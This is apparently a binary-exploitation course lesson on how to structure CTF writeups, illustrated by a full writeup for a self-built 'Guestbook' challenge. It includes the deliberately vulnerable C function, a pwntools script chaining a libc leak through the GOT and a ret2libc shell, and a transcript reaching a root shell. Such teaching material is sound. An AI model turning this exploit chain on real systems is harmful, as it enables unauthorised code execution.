---
title: "Lesson 10.2: How to write a pwn writeup, with a full worked example"
image:
  path: /assets/img/covers/pwn-10-2-write-pwn-writeup-worked-example.webp
  alt: "How to write a pwn writeup, with a full worked example"
date: 2022-12-25 12:05:00 +0700
categories: ["Binary Exploitation", "Pwn · Real-World Practice"]
tags: [pwn, writeup, ret2libc, leak]
render_with_liquid: false
---

Solving a challenge is one thing. Writing it up so someone else (including yourself six months later) can understand it is another, and it matters just as much. A good writeup is what separates a serious CTF player from someone who got lucky. This lesson gives you the structure of a writeup worth reading, then demonstrates it with a complete writeup for a self-built challenge, compiled and exploited for real against a server.

![Two-stage leak-then-ret2libc exploit flow](/assets/img/pwn/pwn-10-2-write-pwn-writeup-worked-example.svg)
_Stage one leaks the libc address of `puts` through the GOT and returns to `main`. Stage two uses the computed libc base to call `system("/bin/sh")`._

**Part:** 10 · **Reading time:** ~70 minutes + lab · **Difficulty:** medium

**Prerequisites:** Lesson 10.1 (the workflow), Lesson 6.1 and 6.2 (ret2libc, leaking libc via the GOT), Lesson 3.2 (offsets).

**Tools:** pwntools, checksec, objdump, gcc. Lab files are described in the Lab section below.

## Goals

After this lesson you will know what sections a writeup needs and why, be able to read a sample writeup that goes from triage to shell with a real transcript, write your own writeup for your own challenge following the same template, and know real practice grounds to train on (pwnable.kr, pwnable.tw, picoCTF).

## Theory: what a writeup contains

A writeup is not just pasting the final `exploit.py` and calling it done. The reader needs to understand the reasoning, not only the result. The template below is what good writeups all have, whether short or long:

1. **Challenge and environment.** Challenge name, source, files given (binary, libc, Dockerfile). Record the exact OS and glibc version, because libc and heap exploits depend tightly on the version. Skip the version and the writeup is useless to anyone trying to reproduce it.
2. **Triage.** `file`, `checksec`, the notable `strings`/`nm` results. This is where the reader gets the lay of the land, which mitigations are on.
3. **Vulnerability analysis.** Which function the bug is in, what kind it is, with the decompiler output or source quoted. State clearly what primitive it gives (control flow, arbitrary read/write).
4. **Exploitation plan.** Following the decision tree from Lesson 10.1: because mitigation X is on, we must leak Y, then use technique Z. Write the plan before pasting code.
5. **Steps, with real measurements.** The offset and how it was measured, what the leaked address was, how the base was computed. Paste real numbers from an actual run.
6. **Full exploit.** A complete, runnable script, with comments on the key lines.
7. **Transcript.** Real output from running it, proving it got a shell or a flag. This is the part most people are laziest about, but it does the most for credibility.
8. **Lessons and pitfalls.** Where you got stuck, and how you got unstuck. This section is the most valuable one for a reader.

Tone: write for someone who knows the field but has not seen this specific challenge. Do not re-explain what a `ret` is, but do explain why you chose ret2libc over ret2syscall. Keep standard English jargon (gadget, leak, canary), do not half-translate it.

## Demo: a sample writeup for the "Guestbook" challenge

Below is a full writeup following the template above. The binary is a self-built challenge (see the Lab section below), compiled and exploited for real against an Ubuntu 24.04 server.

### Challenge and environment

- **Challenge:** Guestbook v1.0 (self-built, equivalent to a typical overflow + leak libc + ret2libc challenge, around the difficulty of a medium picoCTF/pwnable.kr problem).
- **Given:** the `guestbook` binary, dynamically linked, with the matching system libc.
- **Environment:** Ubuntu 24.04.4 LTS, glibc 2.39-0ubuntu8.9, gcc 13.3.0, ASLR enabled.
- **Goal:** get a shell, read `flag.txt`.

### Triage

```
$ file guestbook
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
$ checksec --file=guestbook
RELRO: Partial | Stack: No canary | NX: enabled | PIE: No PIE (0x400000)
```

No PIE (fixed binary addresses), NX enabled (no shellcode on the stack), No canary (overflow goes straight to saved RIP), dynamic (needs libc). `nm` shows no win function, `strings` shows no `/bin/sh` in the binary. There is a `puts`.

### Vulnerability analysis

The `sign()` function reads more than its fixed buffer can hold:

```c
void sign(void) {
    char name[64];
    printf("Please sign here: ");
    read(0, name, 256);          // BUG: 256 bytes into name[64] -> overflows saved RIP
    printf("Thanks, ");
    printf("%s", name);
    puts(" signed the guestbook.");
}
```

Primitive: control flow hijack by overwriting saved RIP. The `name` buffer sits at `rbp-0x40` (read from `objdump -d`), so the offset to saved RIP is `0x40 + 8 = 72`.

### Exploitation plan

Following the Lesson 10.1 decision tree: no win function, NX is on so code reuse is required. Dynamic plus ASLR means libc must be leaked. No PIE means `main`, the PLT, and the GOT are all fixed (no need to leak a PIE base). There is a `puts`, so leaking libc via the GOT is the cleanest route. So:

- **Stage 1:** call `puts(puts@got)` to print the runtime libc address of `puts`, then `ret` back to `main` for a second round.
- **Stage 2:** compute `libc.address = leak - libc.sym['puts']`, then ret2libc `system("/bin/sh")`.

One snag with gcc 13 no-PIE binaries: there is no ready-made `pop rdi ; ret` gadget anymore (`__libc_csu_init` dropped it). This challenge plants a `g_pop_rdi` gadget in the ROP Emporium style so stage 1 has a usable gadget before the libc base is known.

### Steps, with real measurements

- Offset = 72 (measured with cyclic, or by reading `lea -0x40(%rbp)` in objdump).
- `pop rdi ; ret` in the binary = `0x401156`.
- One run: `puts @ libc = 0x72c523e87cc0` -> `libc base = 0x72c523e00000` (page-aligned, valid) -> `system = 0x72c523e58750`, `/bin/sh = 0x72c523fcc42f`.
- Since ASLR is on, these numbers change every run. What stays constant is the method, which is leak minus offset equals base.

### Full exploit

The complete script is `exploit.py` in the Lab section below. The core:

```python
offset = 72
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]   # planted gadget in the binary
ret     = rop.find_gadget(['ret'])[0]              # needed for 16-byte alignment

# Stage 1: leak the libc address of puts, then ret back to main
io.recvuntil(b'sign here: ')
io.send(flat(b'A'*offset, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main']))
io.recvuntil(b'signed the guestbook.\n')
puts_libc = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_libc - libc.sym['puts']
assert libc.address & 0xfff == 0

# Stage 2: ret2libc
io.recvuntil(b'sign here: ')
binsh, system = next(libc.search(b'/bin/sh\x00')), libc.sym['system']
io.send(flat(b'A'*offset, ret, pop_rdi, binsh, system))
time.sleep(0.5)                                    # avoid a race with read, see the pitfalls section
io.sendline(b'id; cat flag.txt')
```

### Transcript

Run three times in a row with ASLR enabled, the libc base changes every time, all three get the flag:

```
----- run #1 -----
[+] puts @ libc = 0x79842c687cc0
[+] libc base   = 0x79842c600000
uid=0(root) gid=0(root) groups=0(root)
FLAG{wr1teup_leak_libc_ret2libc_ok}
----- run #2 -----
[+] puts @ libc = 0x7451fee87cc0
[+] libc base   = 0x7451fee00000
FLAG{wr1teup_leak_libc_ret2libc_ok}
----- run #3 -----
[+] puts @ libc = 0x7ee8e9a87cc0
[+] libc base   = 0x7ee8e9a00000
FLAG{wr1teup_leak_libc_ret2libc_ok}
```

The libc base is `...600000`, `...e00000`, `...a00000`, different every time, proving ASLR is genuinely on and that the exploit does not hardcode any address. The full transcript is `transcript.txt` in the Lab section below.

### Lessons and pitfalls

- **Race with `read`:** on the first run, stage 2 did not produce a shell even though the chain was correct. The reason is that right after sending the payload, the script also sent `id; cat flag.txt` immediately, and `read(256)` swallowed the payload and the command line together, so `/bin/sh` never received anything. Fixed with `time.sleep(0.5)` so `read` finishes consuming the payload and spawns the shell first. This is a classic error whenever a binary reads with `read(fd, buf, N)` for a large N.
- **Alignment:** stage 2 needs a `ret` before `system`, otherwise `movaps` inside `system` aborts.
- **Correct libc version:** the offsets for `system`/`/bin/sh` are computed dynamically from the running libc. Against a real server you must use the server's exact libc (given with the challenge or identified with a libc-database), otherwise the base is off, with the tell being `base & 0xfff != 0`.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 10.2</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/10.2.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/10.2/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/10.2/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/10.2/src.c" download><i class="fa-solid fa-file-code"></i>src.c</a>
</div>
</div>

- Challenge: the binary from the Lab files. Run `build.sh` yourself, then write the exploit from scratch without looking at `exploit.py`, following only the Lesson 10.1 workflow.
- After getting a shell, write your own writeup following the eight sections in the Theory section. Force yourself to write the transcript and lessons sections.
- Tiered hints:
  - Hint 1: once `checksec` is done, walk the decision tree, the plan must exist before any code is typed.
  - Hint 2: measure the offset with cyclic. Stage 1 is `puts(puts@got)` followed by a `ret` back to `main`.
  - Hint 3: if stage 2 does not produce a shell, think about a race with `read`, add a short delay.
- Self-check: is your writeup detailed enough for someone else to reproduce it, even on a different machine (did you record the glibc version)?

## Key takeaways

- [ ] A writeup needs all eight sections: challenge/environment, triage, vulnerability, plan, measurements, exploit, transcript, lessons
- [ ] Always record the OS and glibc version
- [ ] Write the plan (because mitigation X, therefore Y) before pasting code
- [ ] Paste a real transcript, with concrete numbers from one actual run
- [ ] The lessons/pitfalls section is the most valuable one, do not skip it

## Common pitfalls

- Pasting only `exploit.py` and calling it a writeup. The reader does not understand why, and learns very little.
- Forgetting to record the libc/OS version. Someone else reruns it, it fails, and they think the writeup is wrong.
- Hardcoding one run's addresses into the writeup as if they were fixed. Be explicit about what changes with ASLR and what does not.
- Trimming the transcript down to the point where the flag is not even visible. Keep enough lines to prove the result.
- Writing the writeup days later after forgetting everything. Record the measurements (offset, leak) at the moment you solve it.

## Further reading: real practice grounds

The best way to get good at writeups is to solve real challenges and then write them up. A few sources worth grinding, all with the same approach:

- **picoCTF** (picoctf.org, picoGym): the Binary Exploitation category, starting from the basics. Good for drilling the workflow, every challenge is `checksec` then walk the decision tree. Many challenges are just ret2win or ret2libc, exactly the level of Parts 3 and 6. Available year round, with built-in hints.
- **pwnable.kr** (pwnable.kr): a classic wargame, light challenges full of tricks, usually each hammering on one idea. Good for warming up and practicing reading code. Log in via SSH to get the flag, which also builds the habit of working directly on the target machine.
- **pwnable.tw** (pwnable.tw): noticeably harder, closer to modern CTF-style challenges, lots of heap and libc problems. Most challenges come with their own libc, which is exactly the right place to practice identifying and using the correct libc version. Solving a few challenges here means your libc-leak and ret2libc skills are solid.

A shared approach for all three (no need to have their binary locally): download the file, run it through the Lesson 10.1 workflow, solve it, then write it up following the template above. Compare your own writeup with public ones (ctftime.org archives a great many) to learn presentation.

Also worth a look: ROP Emporium (ropemporium.com) to drill ROP specifically, and nightmare (guyinatuxedo.github.io), which dissects individual challenges in detail.
